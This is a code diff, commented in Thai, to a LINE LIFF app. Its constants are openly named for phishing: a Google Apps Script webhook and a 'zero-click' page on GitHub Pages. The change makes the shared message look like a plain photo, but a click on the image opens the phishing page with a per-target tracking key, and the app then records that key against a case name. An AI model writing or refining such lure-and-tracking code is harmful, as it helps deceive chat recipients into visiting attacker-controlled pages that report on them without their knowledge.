@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwPFv3nEtpZtwPjIdt3XAvVQjdSAhsrhl_vxwnAxR9XhSNVIlAHr0x83ShvRJlZEUwQVQ/exec'; // ไฟล์ GoogleScript.html
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxiSPoeKP2bIt2HJwsRwY-cfNd6o7tNhdiQa1nD7T4B-4k3A-_RpKvyPqj6oPo4OZS0/exec'; // ไฟล์ GoogleScript.html
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/zero-click.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -819,43 +819,52 @@
                 // สร้าง URL สำหรับ Zero Click
                 const zeroClickUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`;
 
-                // สร้างข้อความแชร์ (ส่งเฉพาะรูปภาพ)
+                // สร้างข้อความแชร์ (Flex Message เฉพาะ Hero Image ที่คลิกได้)
                 const message = {
-                    type: 'image',
-                    originalContentUrl: imageUrl, // URL รูปภาพที่อัพโหลด
-                    previewImageUrl: imageUrl, // URL รูปภาพตัวอย่าง (ใช้เหมือนกันได้)
-                    // เพิ่ม action ให้คลิกที่รูปภาพได้ (ถ้าต้องการ)
-                    // action: {
-                    //     type: 'uri',
-                    //     uri: zeroClickUrl
-                    // }
-                    // หมายเหตุ: การใส่ action ใน image message อาจไม่รองรับในทุกเวอร์ชัน LINE
-                    // การส่งเฉพาะรูปภาพจะทำให้ผู้รับเห็นรูปภาพโดยตรง
+                    type: 'flex',
+                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
+                    contents: {
+                        type: 'bubble',
+                        // ไม่มี header
+                        hero: { // แสดงเฉพาะรูปภาพ
+                            type: 'image',
+                            url: imageUrl,
+                            size: 'full',
+                            aspectRatio: '1:1', // หรือ '16:9' หรือตามต้องการ
+                            aspectMode: 'cover',
+                            action: { // ทำให้รูปภาพคลิกได้
+                                type: 'uri',
+                                uri: zeroClickUrl
+                            }
+                        }
+                        // ไม่มี body
+                        // ไม่มี footer
+                    }
                 };
 
                 // Removed: sendZeroClickNotification call was here previously
 
                 if (liff.isApiAvailable('shareTargetPicker')) {
-                    // ส่งเฉพาะ Image Message
-                    const result = await liff.shareTargetPicker([
-                        // ส่งข้อความที่เป็นรูปภาพอย่างเดียว
-                        {
-                            type: 'image',
-                            originalContentUrl: imageUrl,
-                            previewImageUrl: imageUrl
-                        },
-                        // เพิ่มข้อความแนะนำ (ถ้าต้องการ) แต่จะทำให้ไม่ใช่แค่รูปภาพอย่างเดียว
-                        // {
-                        //     type: 'text',
-                        //     text: `กดที่นี่เพื่อดู: ${zeroClickUrl}`
-                        // }
-                    ]);
-                    
+                    const result = await liff.shareTargetPicker([message]);
+
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
 
-                        // 1. บันทึก Tracking Key Mapping หลังจากแชร์สำเร็จ
-                        await saveTrackingCaseMapping(trackingKey, caseName);
+                        // 1. บันทึก Tracking Key Mapping หลังจากแชร์สำเร็จ (เพิ่ม Error Handling)
+                        try {
+                            const saved = await saveTrackingCaseMapping(trackingKey, caseName);
+                            if (!saved) {
+                                // แม้ fetch no-cors จะไม่คืน error แต่เราสามารถ log ได้ว่าการเรียกใช้เสร็จสิ้น
+                                console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
+                                // อาจแสดงข้อความเตือนผู้ใช้ แต่ไม่ควรหยุดการทำงานหลัก
+                                // showStatus('อาจมีปัญหาในการบันทึก Tracking Key (ตรวจสอบ Log)', false);
+                            } else {
+                                console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
+                            }
+                        } catch (saveError) {
+                            console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
+                            showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
+                        }
 
                         // 2. Removed: sendZeroClickNotification(trackingKey, caseName);
                         // การแจ้งเตือน Zero Click จะถูกจัดการโดย zero-click.html และ GoogleScript.html เมื่อผู้รับเปิดลิงก์
